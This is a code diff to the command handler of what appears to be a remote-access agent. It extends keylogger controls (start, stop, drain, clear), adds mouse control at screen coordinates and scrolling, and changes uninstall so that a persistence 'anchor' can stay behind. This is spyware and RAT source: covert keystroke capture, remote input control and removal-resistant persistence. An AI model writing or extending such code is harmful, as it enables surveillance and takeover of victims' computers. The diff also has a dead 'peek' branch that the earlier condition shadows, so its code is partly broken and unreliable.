@@ -207,13 +207,22 @@ def cmd_camera(agent, argument: str) -> None:
 @command("key")
 def cmd_key(agent, argument: str) -> str:
     action = (argument or "").strip().lower()
+    log = agent.keylogger
     if action == "start":
-        return agent.keylogger.start()
+        log.start()
+        return "keylogger started" if log.running else "keylogger unavailable (non-Windows)"
     if action == "stop":
-        return agent.keylogger.stop()
-    if action in ("dump", "peek"):
-        return agent.keylogger.peek() or "(nothing recorded yet)"
-    return f"keylogger backend: {agent.keylogger.backend}, active: {agent.keylogger.active}"
+        log.stop()
+        return "keylogger stopped"
+    if action in ("dump", "peek", "get"):
+        text = log.drain()
+        return text or "(nothing recorded yet)"
+    if action == "peek":
+        return log.snapshot() or "(nothing recorded yet)"
+    if action == "clear":
+        log.clear()
+        return "cleared"
+    return f"keylogger running: {log.running}  buffered: {len(log)}"
 
 
 @command("type")
@@ -223,7 +232,33 @@ def cmd_type(agent, argument: str) -> str:
 
 @command("mouse")
 def cmd_mouse(agent, argument: str) -> str:
-    return inputs.mouse(argument)
+    parts = (argument or "").split()
+    if not parts:
+        return "usage: mouse <move|click|right|double|scroll|down|up|clickat|rightat> [x] [y] [n]"
+    action = parts[0].lower()
+    nums = [int(p) for p in parts[1:] if p.lstrip("-").isdigit()]
+    x = nums[0] if len(nums) > 0 else None
+    y = nums[1] if len(nums) > 1 else None
+
+    table = {"clickat": "click", "rightat": "right", "dblat": "double", "moveat": "move"}
+    if action in table:
+        if x is None or y is None:
+            return f"usage: mouse {action} <x> <y>"
+        base = table[action]
+        if base != "move":
+            inputs.mouse(base, x, y)
+            return f"{base} at {x},{y}"
+        inputs.mouse_move(x, y)
+        return f"moved to {x},{y}"
+
+    if action in ("scroll", "wheel"):
+        inputs.mouse_scroll(nums[0] if nums else 1)
+        return f"scrolled {nums[0] if nums else 1}"
+    if x is not None and y is not None:
+        inputs.mouse(action, x, y)
+    else:
+        inputs.mouse(action)
+    return f"mouse {action}"
 
 
 @command("clip.get")
@@ -778,7 +813,8 @@ def cmd_uninstall(agent, argument: str) -> None:
 
     def _do_remove():
         time.sleep(0.5)
-        persistence.remove()
+        from .. import config
+        persistence.remove(keep_anchor=config.protected())
         os._exit(0)
 
     import threading
